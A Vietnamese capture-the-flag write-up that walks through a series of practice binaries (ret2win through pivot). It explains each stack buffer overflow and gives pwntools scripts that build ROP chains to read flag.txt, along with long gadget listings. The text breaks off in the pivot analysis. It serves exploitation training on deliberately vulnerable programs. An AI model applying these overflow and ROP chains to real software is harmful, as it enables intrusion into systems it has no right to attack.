# **Ret2win** 

### Phân tích 
- Dùng IDA để dịch ngược ta thấy có hàm ```pwnme```
![image](https://hackmd.io/_uploads/Hy8mWVl40.png)
- Ta thấy có một lỗi có thể khai thác đó là ```Buffer Overflow``` vì ```s``` chỉ khai báo 32 byte nhưng đọc vào 56 byte, xem chế độ bảo vệ của chương trình
![image](https://hackmd.io/_uploads/rJujW4gNA.png)
- ```Canary``` không được bật nên ta có thể khai thác lỗi ```Buffer Overflow``` 
- Để ý IDA sau khi dịch ngược có hàn ```ret2win```
![image](https://hackmd.io/_uploads/BycgMEgNA.png)
- Hàm này gọi câu lệnh hệ thống để đọc ```flag.txt``` là mục tiêu của ta
- Giờ ta chỉ cần tìm nhập địa chỉ hàm ```ret2win``` sau lệnh ```ret``` của hàm ```pwnme``` 
- Ofset 40 byte
- *Ta cần thêm một địa chỉ lệnh ret trước địa của ```pwnme``` để căn chỉnh `rsp` chia hết cho 16*


---

### Script
```python=
#!/usr/bin/python3

from pwn import *

p = process('./ret2win')

ret2win_address = 0x400756
ret_address =  0x00000000004006e7
payload = b'A'*40
payload += p64(ret_address) + p64(ret2win_address)

p.sendlineafter(b'> ', payload)

p.interactive()
```

# **Split**
### Phân tích
- Tương tự bài ```ret2win``` ta cũng có một lỗi ```Buffer Overflow``` ở hàm `pwnme`
 ![image](https://hackmd.io/_uploads/BktlXWuVC.png)
- Checksec
![image](https://hackmd.io/_uploads/BkobNfuER.png)

- Theo gợi ý bài này thì ta cần trả về hàm gọi ```system``` với tham số là ```/bin/cat flag.txt``` và cũng cho biết chuỗi này nằm trong tệp nhị phân
![image](https://hackmd.io/_uploads/SJOmEzdVR.png)
- Ta thấy có hàm ```usefulFunction``` gọi hàm `system`
![image](https://hackmd.io/_uploads/HJhIUzuVA.png)
![image](https://hackmd.io/_uploads/B1A9LzdNA.png)
- Vì tham số là `/bin/ls` nên ta cần set tham số cho hàm thành `/bin/cat flag.txt` vào thanh ghi `rdi` sau đó gọi hàm `system` , cần tìm gadget `pop rdi` 
![image](https://hackmd.io/_uploads/ByS8DGdV0.png)
- Ofset: 40 byte
- 

---

### Scipt
```python=
#!/usr/bin/python3

from pwn import *

p = process('./split')

callsystem = 0x0040074b
bincat_flag = 0x601060
pop_rdi = 0x00000000004007c3

payload = b'A'*40
payload += p64(pop_rdi)
payload += p64(bincat_flag)
payload += p64(callsystem)

p.sendlineafter(b'> ', payload)

p.interactive()
```

# **Callme**

### Phân tích
- Giống các challeng trước cũng là lỗi `Buffer Overflow` và chế độ bảo vệ của chương trình cũng giống các challenge trước
![image](https://hackmd.io/_uploads/B16cCd_EC.png)
- Theo gợi ý của bài thì ta cần gọi các hàm `callme_one`, `callme_two`, `callme_three` và set các argument cho các hàm để in flag
- Các hàm `callme_` trong PLT
![image](https://hackmd.io/_uploads/H1WYkK_EC.png)
- Xem các hàm trong chương trình ta thấy có hàm `usefulGadgets`, ta có thể set các số cho các hàm `callme_` bằng cách sử dụng hàm `usefulGadgets` vì đã có sẵn các gadget 
![image](https://hackmd.io/_uploads/rkkOxFdVR.png)
- Ofset: 40 byte


---

### Script
```python=
#!/usr/bin/python3

from pwn import *

p = process('./callme')

callme_one = 0x400720
callme_two = 0x400740
callme_three = 0x4006f0

usegadget = 0x000000000040093c
pading_ret = 0x0000000000400897

set_arg = p64(usegadget) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
payload = b'A'*40 + p64(pading_ret) + set_arg + p64(callme_one) + set_arg + p64(callme_two) + set_arg +  p64(callme_three)

p.sendlineafter(b'> ', payload)

p.interactive()
```

# **Write4**

### Phân tích
- Giống các challeng trước cũng là lỗi `Buffer Overflow` và chế độ bảo vệ cũng giống các challenge trước
- Challenge này nhiệm vụ tương tự các challenge trước là đưa tham số `flag.txt` vào hàm `printf_file` để có thể in ra được flag, nhưng trong challenge này thì chuỗi `flag.txt` không có sẵn trong tệp nhị phân nên ta cần nhập và đưa tệp này vào `rdi` trước khi gọi `printf_file`
- Nhưng `rdi` không chứa trực tiếp chuỗi `flag.txt` mà là một con trỏ trỏ đến chuỗi đó
- Ta sẽ tận dụng các gadgets có trong tệp nhị phân để hoàn thành mục tiêu này. Sau khi tìm kiếm, thì nhìn thấy được 2 gadget rất hữu ích có thể khai thác
`0x0000000000400628 : mov qword ptr [r14], r15 ; ret` 
và
`0x0000000000400690 : pop r14 ; pop r15 ; ret`
- Gadget `mov qword ptr [r14], r15 ; ret` là đưa giá trị của `r15` vào địa chỉ đang trỏ tới của `r14` nên bây giờ ta cần đưa chuỗi `flag.txt` vào `r15` và gadget `pop r14 ; pop r15 ; ret` có thể giúp ta làm điều đó
> *Nhưng ta cần đưa chuỗi `flag.txt` vào `rdi` chứ không phải `r14`?*
- Điều ta cần là đưa chuỗi vào `rdi` nhưng lại không tìm thấy gadget `mov rdi, r14`. Ý tưởng ở đây là ta sẽ dùng một địa chỉ cho phép ghi của chương trình để ghi chuỗi này vào địa chỉ đó và gán địa chỉ này vào `rdi` bằng gadget `pop rdi, ret`
![image](https://hackmd.io/_uploads/rkNq3pu40.png)
- Ta `vmmap` để xem khoảng địa chỉ tĩnh cho phép đọc ghi của chương trình
![image](https://hackmd.io/_uploads/HyryrvY4C.png)
- khoảng địa chỉ từ `0x601000` đến `0x602000` cho phép ta ghi và đọc, lấy ngẫu nhiên 1 địa chỉ để ghi chuỗi vào
- Tương tự ta tìm thấy địa chỉ gọi hàm `printf_file` trong hàm `usefulFunction`
![image](https://hackmd.io/_uploads/S17l66_ER.png)
- Ofset: 40 byte
 

---

### Script
```python=
from pwn import *

p = process('./write4')

printf_add = 0x00400620
pop_rdi = 0x0000000000400693
mov_r14_r15 = 0x0000000000400628
pop_r14_r15 = 0x0000000000400690
rw_add = 0x601100

payload = b'A'*40
payload += p64(pop_rdi) + p64(rw_add) + p64(pop_r14_r15) + p64(rw_add) + b'flag.txt' + p64(mov_r14_r15) + p64(printf_add) 

p.sendlineafter(b'> ', payload)

p.interactive()
```
# **Badchars**

### Phân tích
- Challenge này tương tự với `write4` nhưng có một chút thay đổi đó là các kí tự xấu không được cho phép `x` `g` `a`  và đều có trong chuỗi ta cần ghi vào `flag.txt`
- Đọc gợi ý
![image](https://hackmd.io/_uploads/SkpzLwFNA.png)
- Gợi ý của bài là sẽ XOR chuỗi này với khi đưa vào
- Khi đưa vào ta cần XOR ngược lại lần nữa để có chuỗi `flag.txt`, tìm qua các gadget thì thấy có các gadget rất hữu dụng 
```
0x0000000000400628 : xor byte ptr [r15], r14b ; ret
```
- Nhưng mỗi lần XOR chỉ có một byte đầu được XOR nên ta XOR 8 lần để có được chuỗi
- *Giờ làm sao để `r15` chứa địa chỉ trỏ tới của chuỗi đã XOR khi đưa vào?* Thì sau khi tìm qua các gadget ta có những gadget này có thể giúp ta làm việc đó
```
0x0000000000400634 : mov qword ptr [r13], r12 ; ret
0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
```
- Làm tương tụ với `write4` là đưa 1 địa chỉ cho phép ghi và đọc vào `r13`, `r15`. Sau đó đưa chuỗi đã XOR vào `r12` và dùng các gagdget trên địa chỉ trỏ vào chuỗi 
- Tương tự challenge trên hàm gọi `printf_file` nằm trong `usefulFunction`
![image](https://hackmd.io/_uploads/S19JYwF40.png)
- Ofset: 40 byte


---

### Script
```python=
#!/usr/bin/python3

def xor_2(s):
        res = ""
        for i in s:
                res += chr(ord(i)^2)
        return res

from pwn import *

p = process('./badchars')

xor_r15_r14b = 0x0000000000400628
pop_r12_r13_r14_r15 = 0x000000000040069c
mov_r13_r12 = 0x0000000000400634
pop_rdi = 0x00000000004006a3
pop_r14_r15 = 0x00000000004006a0
call_printf = 0x0000000000400620
rw_add = 0x601100

flag_xor = xor_2('flag.txt')
flag_xor = flag_xor.encode()

payload = b'B'*40
payload += p64(pop_rdi) + p64(rw_add)
payload += p64(pop_r12_r13_r14_r15) + flag_xor + p64(rw_add) + p64(2) + p64(rw_add)
payload += p64(mov_r13_r12)

for i in range(8):
        payload += p64(pop_r14_r15)
        payload += p64(2) + p64(rw_add + i)
        payload += p64(xor_r15_r14b)

payload += p64(call_printf)

p.sendlineafter(b'> ', payload)

p.interactive()
```

# **Fluff**

### Phânn tích
- Tương tự các challenge trên ta có lỗi `Buffer Overflow` và chế độ bảo vệ vẫn thế
- Gợi ý của bài
![image](https://hackmd.io/_uploads/Byg-4xsNR.png)
- Nhiệm vụ của ta cũng giống challenge trước là đưa đối số là chuỗi `flag.txt` vào hàm `printf_file` để in flag
- Ta tìm các gadget có hữu ích để có thể đưa chuỗi `flag.txt`
```
Gadgets information
============================================================
0x0000000000400285 : adc al, 0xd9 ; in eax, 0xfb ; jp 0x4002f6 ; retf 0x8bc4
0x000000000040057e : adc byte ptr [rax], ah ; jmp rax
0x0000000000400502 : adc cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 0 ; jmp 0x4004f0
0x0000000000400632 : add ah, al ; loop 0x40061e ; neg ecx ; ret
0x000000000040061e : add al, bpl ; jmp 0x400621
0x000000000040061f : add al, ch ; jmp 0x400621
0x000000000040054f : add bl, dh ; ret
0x00000000004006ad : add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004006ab : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x0000000000400507 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4004f0
0x0000000000400611 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000004005fc : add byte ptr [rax], al ; add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400590
0x00000000004005fd : add byte ptr [rax], al ; add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x400590
0x0000000000400631 : add byte ptr [rax], al ; bextr rbx, rcx, rdx ; ret
0x0000000000400509 : add byte ptr [rax], al ; jmp 0x4004f0
0x0000000000400586 : add byte ptr [rax], al ; pop rbp ; ret
0x00000000004005fe : add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400590
0x0000000000400585 : add byte ptr [rax], r8b ; pop rbp ; ret
0x00000000004005ff : add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x400590
0x0000000000400283 : add byte ptr [rbx], ch ; adc al, 0xd9 ; in eax, 0xfb ; jp 0x4002f6 ; retf 0x8bc4
0x00000000004005e7 : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400630 : add byte ptr ds:[rax], al ; bextr rbx, rcx, rdx ; ret
0x0000000000400517 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x4004f0
0x00000000004004e3 : add esp, 8 ; ret
0x00000000004004e2 : add rsp, 8 ; ret
0x0000000000400504 : and byte ptr [rax], al ; push 0 ; jmp 0x4004f0
0x0000000000400514 : and byte ptr [rax], al ; push 1 ; jmp 0x4004f0
0x00000000004004d9 : and byte ptr [rax], al ; test rax, rax ; je 0x4004e2 ; call rax
0x0000000000400633 : bextr rbx, rcx, rdx ; ret
0x000000000040070f : call qword ptr [rax + 1]
0x0000000000400624 : call qword ptr [rax - 0x3c283ca3]
0x00000000004007a3 : call qword ptr [rax]
0x00000000004007c3 : call qword ptr [rcx]
0x00000000004004e0 : call rax
0x0000000000400637 : fld st(3) ; stosb byte ptr [rdi], al ; ret
0x000000000040068c : fmul qword ptr [rax - 0x7d] ; ret
0x0000000000400286 : fxam ; sti ; jp 0x4002f6 ; retf 0x8bc4
0x0000000000400603 : in eax, 0x5d ; jmp 0x400590
0x0000000000400287 : in eax, 0xfb ; jp 0x4002f6 ; retf 0x8bc4
0x00000000004004de : je 0x4004e2 ; call rax
0x0000000000400579 : je 0x400588 ; pop rbp ; mov edi, 0x601038 ; jmp rax
0x00000000004005bb : je 0x4005c8 ; pop rbp ; mov edi, 0x601038 ; jmp rax
0x00000000004002cc : jmp 0x4002a1
0x000000000040050b : jmp 0x4004f0
0x0000000000400605 : jmp 0x400590
0x0000000000400621 : jmp 0x400621
0x00000000004006df : jmp qword ptr [rax + 0x50000000]
0x00000000004006e7 : jmp qword ptr [rax]
0x00000000004007e3 : jmp qword ptr [rbp]
0x0000000000400581 : jmp rax
0x0000000000400289 : jp 0x4002f6 ; retf 0x8bc4
0x0000000000400634 : loop 0x40061e ; neg ecx ; ret
0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
0x0000000000400602 : mov ebp, esp ; pop rbp ; jmp 0x400590
0x000000000040057c : mov edi, 0x601038 ; jmp rax
0x0000000000400601 : mov rbp, rsp ; pop rbp ; jmp 0x400590
0x0000000000400636 : neg ecx ; ret
0x0000000000400625 : nop ; pop rbp ; ret
0x0000000000400583 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000004005c5 : nop dword ptr [rax] ; pop rbp ; ret
0x00000000004005e5 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400512 : or cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 1 ; jmp 0x4004f0
0x00000000004005e4 : or r12b, byte ptr [r8] ; add byte ptr [rcx], al ; pop rbp ; ret
0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040069e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006a0 : pop r14 ; pop r15 ; ret
0x00000000004006a2 : pop r15 ; ret
0x0000000000400604 : pop rbp ; jmp 0x400590
0x000000000040057b : pop rbp ; mov edi, 0x601038 ; jmp rax
0x000000000040069b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040069f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400588 : pop rbp ; ret
0x00000000004006a3 : pop rdi ; ret
0x00000000004006a1 : pop rsi ; pop r15 ; ret
0x000000000040069d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400506 : push 0 ; jmp 0x4004f0
0x0000000000400516 : push 1 ; jmp 0x4004f0
0x0000000000400282 : push rbp ; add byte ptr [rbx], ch ; adc al, 0xd9 ; in eax, 0xfb ; jp 0x4002f6 ; retf 0x8bc4
0x0000000000400600 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400590
0x0000000000400295 : ret
0x000000000040028b : retf 0x8bc4
0x00000000004004dd : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x00000000004004d7 : sbb eax, 0x4800200b ; test eax, eax ; je 0x4004e2 ; call rax
0x0000000000400288 : sti ; jp 0x4002f6 ; retf 0x8bc4
0x0000000000400639 : stosb byte ptr [rdi], al ; ret
0x0000000000400284 : sub edx, dword ptr [rcx + rbx*8] ; in eax, 0xfb ; jp 0x4002f6 ; retf 0x8bc4
0x00000000004006b5 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004006b4 : sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004004dc : test eax, eax ; je 0x4004e2 ; call rax
0x00000000004004db : test rax, rax ; je 0x4004e2 ; call rax
0x0000000000400628 : xlatb ; ret

Unique gadgets found: 92
```
- Có vẻ không có các gadget nào hợp lí để có thể nhập chuỗi vào `rdi`. Hãy xem hàm `questionableGadgets` mà bài đã gợi ý 
![image](https://hackmd.io/_uploads/BkZqBgiEA.png)
- Tìm hiểu qua các lệnh
    - [xlat](https://www.felixcloutier.com/x86/xlat:xlatb) là lệnh dùng để đưa 1 byte từ địa chỉ `[rbx + al]` vào thanh ghi `al`
    - [bextr](https://www.felixcloutier.com/x86/bextr) là lệnh dùng trích xuất một trường bit từ thanh ghi `rcx` vào thanh ghi `rbx` với thanh ghi chỉ định `rdx`. Trong đó `rdx` có 8 bit có trọng số thấp nhất chỉ định vị trí bắt đầu để trích xuất các bit từ `rcx` sang `rbx`, 8 bit tiếp theo trong `rdx` chỉ định số bit trích xuất từ vị trí bắt đầu 
    - [stos](https://www.felixcloutier.com/x86/stos:stosb:stosw:stosd:stosq) là lệnh lưu trữ 1 byte từ thanh ghi `al` vào địa chỉ được chỉ định `es:[rdi]`
- Ta thấy sau các lệnh đó đều có lệnh `ret` theo sau nên ta có thể tách ra thành các gadget và sắp xếp để đạt được mục tiêu
- Sau khi biết cách hoạt động của các lệnh ta có một hướng khai thác là 
    -  sử dụng `bextr` và set thanh ghi `rcx` là địa chỉ của từng kí tự trong chuỗi `flag.txt` và `rdx` có giá trị `0x4000 = 01000000 0000000` để `rbx` trích xuất tất cả các bit trong `rcx`. Khi đó `rbx` mang giá trị của 1 địa chỉ của kí tự có trong chuỗi
    -   Sau đó dùng `xlat` để `al` lưu trữ 1 kí tự trong chuỗi
     > Nhưng ta cần set giá trị `al` bằng `0` trước để khi lệnh `xlat` thực thi thì `al` lưu trữ byte tại địa chỉ `[rbx]`. Tìm gadget có một gadget giúp ta làm việc đó `0x0000000000400610 : mov eax, 0 ; pop rbp ; ret` 
     > Gadget này có lệnh `pop rbp` thì có thể set giá trị tùy ý vì ở sau không có lệnh `leave`
    -   Sau đó dùng `stos` để lưu trữ kí tự đó tại vị trí của `rdi` đang trỏ tới và ta set `rdi` bằng địa chỉ cho phép ghi và đọc trong chương trình 
- Để set các giá trị của `rcx`, `rdx`, `rdi` thì ta đã có sẵn các lệnh `pop rcx`, `pop rdx`, `pop rdi`. Nhưng khi ta set thanh ghi `rcx` thì sau đó là lệnh `add rcx, 0x3ef2` nên khi ta set giá trị cho `rcx` thì cần trừ cho `0x3ef2` để sau đó cộng vào thì giá trị sẽ không đổi
- Nhưng vì không có sẵn chuỗi `flag.txt` trong chương trình nên tìm địa chỉ riêng lẻ ghép lại thành chuỗi 
- Dùng công cụ `radare2` để tìm địa chỉ các kí tự
![image](https://hackmd.io/_uploads/rkt6ogi4C.png)

![image](https://hackmd.io/_uploads/rJ7Ajgo4C.png)

![image](https://hackmd.io/_uploads/Bk60slj40.png)

![image](https://hackmd.io/_uploads/rk5J3lo4R.png)

![image](https://hackmd.io/_uploads/H1BghejVC.png)

![image](https://hackmd.io/_uploads/HyHEhxiNC.png)

![image](https://hackmd.io/_uploads/S104nxo4R.png)


- Sau khi có tất cả các thông tin ta viết script và chạy
- **Nhưng nó bị lỗi?**
![image](https://hackmd.io/_uploads/HJsukZsV0.png)
- Sau khi debug thì thấy đầu vào chỉ dừng lại ở kí tự thứ 6 
> Có vẻ đầu vào quá dài nên tràn qua vùng nhớ không cho phép ghi của chương trình?
- Ta cần giảm kích thước đầu vào bằng cách loại bỏ gadget ```0x0000000000400610 : mov eax, 0 ; pop rbp ; ret``` thay vào đó thì ta trừ `rbx` bằng giá trị thanh ghi `al` trước đó

### Script
```python=
#!/usr/bin/python3

from pwn import *

exe = ELF('./fluff', checksec = False)

p = process(exe.path)

xlat = p64(0x0000000000400628)
pop_rdx_rcx_bextr = p64(0x000000000040062a)
stos = p64(0x0000000000400639)
pop_rdi = p64(0x00000000004006a3)
call_printf = p64(0x0000000000400620)
char_flag_add = [0x004003c4, 0x00400239, 0x004003d6, 0x004003cf, 0x0040024e, 0x00400192, 0x00400246, 0x00400192]
flag = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']
rw_add = 0x601100

#mov_eax = p64(0x0000000000400610)

payload = b'A'*40 
for i in range(0,8):
	if i == 0:
		temp = 0xb
	else: temp = ord(flag[i-1])
	payload += pop_rdi + p64(rw_add+i)
	payload += pop_rdx_rcx_bextr + p64(0x4000) + p64(char_flag_add[i] - 0x3ef2 - temp)
	payload += xlat
	payload += stos
	
payload += pop_rdi + p64(rw_add)
payload += call_printf

#input()
p.sendlineafter(b'> ', payload)

p.interactive()
```

# **Pivot**

### Phân tích
- Tương tự có lỗi `Buffer Overflow` ở hàm `pwnme`, chế độ bảo vệ tương tự các challenge trước
![image](https://hackmd.io/_uploads/HysRV-jVC.png)
- Chương trình cho ta 2 lần nhập, lần thứ nhất không có vấn đề gì, lần thứ 2 có lỗi `buffer overflow` khi đọc `64 byte` vào mảng `s` nhưng `s` khai báo chỉ có `32 byte`
- Gợi ý của challenge

![image](https://hackmd.io/_uploads/SJLyVWoNR.png)

-  Theo gợi ý của challenge thì nhiệm vụ của ta cần gọi hàm `ret2win()` từ `libpivot.so` để in được flag
-  Vì hàm `ret2win()` không được nhập ở đâu trong chương trình nên ta phải gọi hàm `ret2win()` bằng cách tìm ofset giữa hàm `foothold_function()` trong `libpivot.so`, vì hàm `foothold_function()` đã có trong tệp nhị phân chương trình (tuy nhiên không có trong luồng thực thi chương trình)
-  Để có được thể có được địa chỉ thực của hàm  `ret2win()` thì ta cần tìm địa chỉ thực của `foothold_function()` và cộng thêm ofset đã tính
-  Vì hàm `foothold_function()` không được gọi trong luồng thực thi chương trình nên để có được địa chỉ thực ta phải gọi hàm đó 1 lần thì địa chỉ thực của hàm sẽ được trỏ tới bởi địa chỉ `.got` của hàm 
    -  >[Tìm hiểu về got và plt](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)
- Tìm địa chỉ plt của hàm `foothold_function()`
![image](https://hackmd.io/_uploads/B1_nLziNC.png)
- Tìm địa chỉ got của `foothold_function()`
![image](https://hackmd.io/_uploads/SyNVaNiNA.png)

- Tìm ofset giữa hàm `ret2win()` và `foothold_function()`. Dùng `nm` để xem các hàm trong thư viện động đã cho
![image](https://hackmd.io/_uploads/B1mGPfs4C.png)
- Ofset: `0x0000000000000a81 - 0x000000000000096a = 0x117`
- Để có thể gọi hàm `foothold_function()` thì chúng ta thông qua chuỗi rop để có thể thực hiện
```
Gadgets information
============================================================
0x00000000004007be : adc byte ptr [rax], ah ; jmp rax
0x0000000000400732 : adc cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 6 ; jmp 0x4006c0
0x0000000000400717 : add al, 0 ; add byte ptr [rax], al ; jmp 0x4006c0
0x0000000000400916 : add al, bpl ; ret
0x00000000004006f7 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x4006c0
0x0000000000400917 : add al, ch ; ret
0x00000000004009c2 : add bl, al ; add rax, rbp ; ret
0x000000000040078f : add bl, dh ; ret
0x0000000000400a3d : add byte ptr [rax], al ; add bl, dh ; ret
0x0000000000400a3b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004006d7 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4006c0
0x00000000004008eb : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x000000000040083c : add byte ptr [rax], al ; add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4007d0
0x000000000040083d : add byte ptr [rax], al ; add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x4007d0
0x00000000004008ec : add byte ptr [rax], al ; add cl, cl ; ret
0x00000000004006d9 : add byte ptr [rax], al ; jmp 0x4006c0
0x00000000004008ed : add byte ptr [rax], al ; leave ; ret
0x00000000004007c6 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040083e : add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4007d0
0x00000000004007c5 : add byte ptr [rax], r8b ; pop rbp ; ret
0x000000000040083f : add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x4007d0
0x0000000000400827 : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400752 : add cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 8 ; jmp 0x4006c0
0x00000000004008ee : add cl, cl ; ret
0x00000000004006e7 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x4006c0
0x0000000000400707 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x4006c0
0x00000000004009c5 : add eax, ebp ; ret
0x00000000004006b3 : add esp, 8 ; ret
0x00000000004009c4 : add rax, rbp ; ret
0x00000000004006b2 : add rsp, 8 ; ret
0x00000000004006d4 : and byte ptr [rax], al ; push 0 ; jmp 0x4006c0
0x00000000004006e4 : and byte ptr [rax], al ; push 1 ; jmp 0x4006c0
0x00000000004006f4 : and byte ptr [rax], al ; push 2 ; jmp 0x4006c0
0x0000000000400704 : and byte ptr [rax], al ; push 3 ; jmp 0x4006c0
0x0000000000400714 : and byte ptr [rax], al ; push 4 ; jmp 0x4006c0
0x0000000000400724 : and byte ptr [rax], al ; push 5 ; jmp 0x4006c0
0x0000000000400734 : and byte ptr [rax], al ; push 6 ; jmp 0x4006c0
0x0000000000400744 : and byte ptr [rax], al ; push 7 ; jmp 0x4006c0
0x0000000000400754 : and byte ptr [rax], al ; push 8 ; jmp 0x4006c0
0x00000000004006a9 : and byte ptr [rax], al ; test rax, rax ; je 0x4006b2 ; call rax
0x0000000000400712 : and cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 4 ; jmp 0x4006c0
0x00000000004009ba : call ptr [rax - 0x3d]
0x00000000004009a4 : call qword ptr [rax + 0x4855c3c9]
0x0000000000400b93 : call qword ptr [rax - 0x2d000000]
0x0000000000400c8b : call qword ptr [rbx]
0x00000000004006b0 : call rax
0x00000000004006e2 : cmp cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 1 ; jmp 0x4006c0
0x0000000000400a1c : fmul qword ptr [rax - 0x7d] ; ret
0x0000000000400843 : in eax, 0x5d ; jmp 0x4007d0
0x00000000004006ae : je 0x4006b2 ; call rax
0x00000000004007b9 : je 0x4007c8 ; pop rbp ; mov edi, 0x601070 ; jmp rax
0x00000000004007fb : je 0x400808 ; pop rbp ; mov edi, 0x601070 ; jmp rax
0x00000000004002d0 : jmp 0x4002a5
0x00000000004006db : jmp 0x4006c0
0x0000000000400845 : jmp 0x4007d0
0x0000000000400c23 : jmp qword ptr [rax]
0x0000000000400cab : jmp qword ptr [rbp]
0x00000000004007c1 : jmp rax
0x00000000004008ef : leave ; ret
0x0000000000400822 : mov byte ptr [rip + 0x20084f], 1 ; pop rbp ; ret
0x00000000004008ea : mov eax, 0 ; leave ; ret
0x00000000004009c1 : mov eax, dword ptr [rax] ; ret
0x0000000000400842 : mov ebp, esp ; pop rbp ; jmp 0x4007d0
0x00000000004007bc : mov edi, 0x601070 ; jmp rax
0x00000000004009c0 : mov rax, qword ptr [rax] ; ret
0x0000000000400841 : mov rbp, rsp ; pop rbp ; jmp 0x4007d0
0x00000000004009a5 : nop ; leave ; ret
0x00000000004007c3 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x0000000000400805 : nop dword ptr [rax] ; pop rbp ; ret
0x0000000000400824 : or byte ptr [r8], r12b ; add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400825 : or byte ptr [rax], ah ; add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400757 : or byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4006c0
0x0000000000400742 : or cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 7 ; jmp 0x4006c0
0x0000000000400a2c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400a2e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400a30 : pop r14 ; pop r15 ; ret
0x0000000000400a32 : pop r15 ; ret
0x00000000004009bb : pop rax ; ret
0x0000000000400844 : pop rbp ; jmp 0x4007d0
0x00000000004007bb : pop rbp ; mov edi, 0x601070 ; jmp rax
0x0000000000400a2b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400a2f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004007c8 : pop rbp ; ret
0x0000000000400a33 : pop rdi ; ret
0x0000000000400a31 : pop rsi ; pop r15 ; ret
0x0000000000400a2d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006d6 : push 0 ; jmp 0x4006c0
0x00000000004006e6 : push 1 ; jmp 0x4006c0
0x00000000004006f6 : push 2 ; jmp 0x4006c0
0x0000000000400706 : push 3 ; jmp 0x4006c0
0x0000000000400716 : push 4 ; jmp 0x4006c0
0x0000000000400726 : push 5 ; jmp 0x4006c0
0x0000000000400736 : push 6 ; jmp 0x4006c0
0x0000000000400746 : push 7 ; jmp 0x4006c0
0x0000000000400756 : push 8 ; jmp 0x4006c0
0x0000000000400840 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4007d0
0x00000000004006b6 : ret
0x00000000004006ad : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000400722 : sbb cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 5 ; jmp 0x4006c0
0x0000000000400702 : sub cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 3 ; jmp 0x4006c0
0x0000000000400a45 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000400a44 : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000400914 : test eax, 0xe800400a ; ret
0x00000000004006ac : test eax, eax ; je 0x4006b2 ; call rax
0x00000000004006ab : test rax, rax ; je 0x4006b2 ; call rax
0x00000000004009be : xchg esp, eax ; ret
0x00000000004009bd : xchg rsp, rax ; ret
0x00000000004006f2 : xor cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 2 ; jmp 0x4006c0

Unique gadgets found: 108
```
- Xem qua các gadget thì có các gadget hữu ích để gọi được hàm `foothold_function()`
    - `0x00000000004009bb : pop rax ; ret` để `rax` mang giá trị địa chỉ `.got` của hàm 
    - `0x00000000004009c0 : mov rax, qword ptr [rax] ; ret` để `rax` bằng địa chỉ `plt` 
    - Sau khi cập nhật địa chỉ thực của hàm `foothold_function()` thì cộng ofset để ra địa chỉ thực của hàm `ret2win()`
        > rax + ofset = địa chỉ hàm `ret2win()`
    - Có một gadget để cộng `rax` : `0x00000000004009c4 : add rax, rbp ; ret`
